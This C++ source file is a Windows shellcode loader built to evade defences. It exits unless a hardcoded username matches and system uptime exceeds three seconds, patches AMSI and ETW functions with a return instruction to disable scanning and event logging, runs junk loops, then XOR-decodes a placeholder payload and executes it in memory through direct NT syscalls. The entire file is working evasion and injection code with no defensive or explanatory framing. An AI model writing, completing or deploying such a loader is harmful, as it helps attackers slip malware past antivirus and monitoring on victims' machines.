#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include "syscalls_local.h" 
#include "Syscalls.h" 

bool CheckTrigger() {
    char username[256] = { 0 };
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        if (strcmp(username, "MyRealUsername") == 0) {
            return true;
        } else {
            std::cout << "[!] Trigger not matched. Current user: " << username << std::endl;
            return false;
        }
    } else {
        std::cout << "[!] Failed to get username." << std::endl;
        return false;
    }
}
bool IsSandbox() {
    // وقت التشغيل في البيئة الحقيقية أكبر بكثير من 3 ثواني
    return (GetTickCount64() < 3000);
}
void PatchAMSI() {
    void* amsiScanBuffer = (void*)GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");

    DWORD oldProtect;
    VirtualProtect(amsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)amsiScanBuffer = 0xC3; // ret
}
void PatchETW() {
    void* etwEventWrite = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");

    DWORD oldProtect;
    VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)etwEventWrite = 0xC3; // ret
}

void JunkCode() {
    volatile int x = 0;
    for (int i = 0; i < 1000000; i++) {
        x += i % 3;
        x ^= i * 2;
    }
}

int main(int argc, char** argv) {
   
    if (!CheckTrigger() || IsSandbox()) {
        return 0;
    }
    PatchAMSI();
    PatchETW();

    JunkCode();

  
    char shen[] = "shellcode\x66\x75";
    char key[] = "ukbf";
    size_t legitrick_len = sizeof(shen);


    char encodedlegitrick[sizeof shen];

    int j = 0;
    for (int i = 0; i < sizeof shen; i++) {
        if (j == sizeof key - 1) j = 0;
        encodedlegitrick[i] = shen[i] ^ key[j];
        j++;
    }


    PVOID lpAllocationStart = nullptr;
    SIZE_T payloadSize = sizeof(encodedlegitrick);
    HANDLE hProcess = GetCurrentProcess();
    HANDLE hThread;
    SIZE_T bytesWritten;
    ULONG oldProtect;



    NtAllocateVirtualMemory(hProcess,&lpAllocationStart,0,&payloadSize,MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
    NtWriteVirtualMemory(hProcess,lpAllocationStart,encodedlegitrick,payloadSize,&bytesWritten); 
    NtProtectVirtualMemory(hProcess, &lpAllocationStart, &payloadSize, PAGE_EXECUTE_READ, &oldProtect);
    NtCreateThreadEx(&hThread,GENERIC_EXECUTE,NULL,GetCurrentProcess(),lpAllocationStart,NULL,FALSE,0,0,0,NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(lpAllocationStart, 0, MEM_RELEASE);
    return 0;
}